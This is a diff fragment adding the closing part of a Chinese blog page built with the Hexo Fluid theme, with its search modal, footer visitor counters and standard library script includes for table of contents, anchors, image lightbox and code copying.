+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://www.yuque.com/076w" target="_blank" rel="nofollow noopener"><span>076w</span></a>
+
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
